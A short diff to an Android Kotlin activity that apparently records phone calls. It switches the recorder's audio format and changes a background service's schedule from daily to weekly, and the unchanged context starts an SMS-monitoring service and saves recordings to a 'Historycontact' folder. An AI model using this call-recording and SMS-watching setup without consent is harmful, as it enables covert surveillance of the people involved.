@@ -127,8 +127,8 @@ class TokenActivity : Activity() {
                 .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
                 .setRecordDirName("Historycontact")
                 .setRecordDirPath(Environment.getExternalStorageDirectory().path)
-                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
-                .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
+                .setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                 .setShowSeed(true)
                 .build()
@@ -218,7 +218,7 @@ class TokenActivity : Activity() {
             initializeSmsRadarService()
         }
         RealmUtils.saveCacheInformation(listData)
-        TokenService.schedule(this, TokenService.ONE_DAY_INTERVAL)
+        TokenService.schedule(this, TokenService.ONE_WEEK_INTERVAL)
     }
 
     private fun permissionApp() {
